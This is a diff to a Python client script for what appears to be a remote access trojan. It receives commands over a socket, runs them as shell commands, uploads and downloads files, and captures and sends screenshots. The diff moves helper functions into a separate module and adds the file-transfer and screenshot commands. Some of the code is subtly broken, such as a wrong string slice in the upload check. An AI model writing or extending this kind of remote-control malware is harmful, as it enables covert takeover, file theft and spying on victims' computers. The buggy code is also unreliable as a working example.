@@ -1,30 +1,16 @@
+#!/usr/bin/python3
+
+# client-side
+
 # modules
 
 import socket
 import os
 import subprocess
+from definitions import *
 
 # definitions
 
-
-def send_error(msg):
-    err_msg = f'[From client] {msg}'
-    client.send(err_msg.encode())
-
-def download(file):
-    with open(file, 'wb') as f:
-        chunk = client.recv(1024)
-        if not chunk:
-            break
-        f.write(chunk)
-
-def upload(file):
-    with open(file, 'rb') as f:
-        while True:
-            chunk = f.read(1023)
-            if not chunk:
-                break
-            client.sendall(chunk)
 
 # main program
 
@@ -42,7 +28,17 @@ while True:
         try:
             os.chdir(comm[3:])
         except FileNotFoundError as e:
-            send_error(e)
+            send_error(client, e)
+    elif comm[7:] == 'upload ':
+        file = comm[7:]
+        download(client, file)
+    elif comm[:9] == 'download ':
+        file = comm[9:]
+        upload(client, file)
+    elif comm == 'screenshot':
+        screenshot_client()
+        upload(client, 'screenshot.png')
+        os.remove('screenshot.png')
     else:
         try:
             output = subprocess.check_output(comm, text=True, shell=True)
@@ -51,5 +47,5 @@ while True:
             else:
                 client.send('not output!'.encode())
         except Exception as e:
-            send_error(e)
+            send_error(client, e)
 client.close()
